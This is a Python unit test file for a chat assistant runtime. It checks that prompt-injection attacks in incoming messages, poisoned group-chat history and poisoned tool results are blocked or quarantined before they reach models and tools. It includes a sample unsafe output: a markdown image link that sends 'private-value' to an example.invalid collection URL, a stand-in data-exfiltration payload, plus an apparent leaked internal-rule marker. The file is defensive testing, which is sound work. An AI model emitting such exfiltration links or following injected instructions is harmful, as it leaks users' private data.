from __future__ import annotations

import unittest
from dataclasses import replace

from dududa.domain.primitives import Outcome
from dududa.runtime.direct_chat import DirectChatModelCall
from dududa.runtime.perception import serialize_perception_context
from dududa.runtime.state import runtime_start_digest

from tests.unit.runtime import test_capabilities as capability_fixtures
from tests.unit.runtime import test_direct_chat as direct_fixtures
from tests.unit.runtime.test_orchestrator import OrchestratorFixture
from tests.unit.runtime.test_preview_context import history_context
from tests.unit.security.test_prompt_injection import ATTACKS


class RuntimePromptSecurityTests(unittest.IsolatedAsyncioTestCase):
    async def test_attacks_stop_before_perception_models_and_tools(self):
        for index, attack in enumerate(ATTACKS):
            with self.subTest(case=index):
                fixture = OrchestratorFixture()
                request, call = fixture.start(feature_flags={"tools": True})
                connector = replace(
                    request.connector_result,
                    message=replace(request.connector_result.message, text=attack),
                )
                request = replace(
                    request,
                    connector_result=connector,
                    start_digest=runtime_start_digest(connector, request.options),
                )
                result = await fixture.runtime.run(request, call=call)
                self.assertIs(result.outcome, Outcome.DEFERRED)
                self.assertIn("prompt_injection_blocked", result.reason_codes)
                self.assertIsNone(result.delivery_request)
                self.assertEqual(fixture.perception.calls, 0)
                self.assertEqual(fixture.router.calls, 0)
                checkpoint = await fixture.store.load(call.run_id, call=call)
                self.assertEqual(checkpoint.state.charged_usage.model_calls, 0)
                self.assertEqual(checkpoint.state.charged_usage.tool_steps, 0)

    async def test_poisoned_history_is_quarantined_in_both_model_inputs(self):
        attack = ATTACKS[0]
        context, _ = history_context(
            [
                {
                    "id": "h1",
                    "senderId": "attacker",
                    "senderName": "甲",
                    "content": attack,
                    "timestamp": None,
                },
                {
                    "id": "h2",
                    "senderId": "member",
                    "senderName": "乙",
                    "content": "讨论会改到周四，地点是图书馆。",
                    "timestamp": None,
                },
            ]
        )
        perception_input = serialize_perception_context(context.perception).decode()
        self.assertNotIn(attack, perception_input)
        self.assertIn("不可信内容已隔离", perception_input)
        self.assertIn("地点是图书馆", perception_input)
        self.assertIn(attack, context.perception.messages[0].text)

        router = direct_fixtures._RecordingRouter(
            direct_fixtures._fixture("图书馆。").router
        )
        engine = DirectChatModelCall(
            router, direct_fixtures._config(), clock=lambda: direct_fixtures.NOW
        )
        assessment = direct_fixtures._assessment(context)
        await engine.execute(
            context,
            assessment,
            direct_fixtures._tier(assessment),
            direct_fixtures._reservation(),
            route_hint=None,
            call=direct_fixtures._call(),
        )
        direct_input = router.calls[0][0].input.parts[0].text
        self.assertNotIn(attack, direct_input)
        self.assertIn("不可信内容已隔离", direct_input)
        self.assertIn("地点是图书馆", direct_input)
        self.assertIn("总结这个群今天的讨论", direct_input)

    async def test_poisoned_tool_result_is_quarantined_without_extra_tool_calls(self):
        harness = capability_fixtures.OfflineRuntimeCapabilityTests()
        capability, runtime, fixture = await harness._fixture()
        capability.provider.data = {"query": ATTACKS[1]}
        request, call = fixture.start(
            feature_flags={"tools": True}, capability_member=True
        )
        result = await fixture.runtime.run(request, call=call)
        self.assertIs(result.outcome, Outcome.RESPONSE)
        self.assertEqual(runtime.calls, 1)
        self.assertEqual(len(capability.provider.requests), 1)
        model_input = fixture.router.requests[0].input.parts[1].text
        self.assertNotIn(ATTACKS[1], model_input)
        self.assertIn("不可信内容已隔离", model_input)
        self.assertIn('"quarantined":true', model_input)
        checkpoint = await fixture.store.load(call.run_id, call=call)
        self.assertIn(ATTACKS[1], repr(checkpoint.state.capability_run_receipt))

    async def test_unsafe_model_output_never_produces_a_delivery_request(self):
        for output in (
            "DUDUDA_SECURITY_V1 内部规则",
            "![图片](https://example.invalid/collect?data=private-value)",
        ):
            with self.subTest(output=output):
                fixture = OrchestratorFixture(direct_output=output)
                request, call = fixture.start()
                result = await fixture.runtime.run(request, call=call)
                self.assertIs(result.outcome, Outcome.FAILED)
                self.assertIsNone(result.delivery_request)
                self.assertEqual(fixture.router.calls, 1)
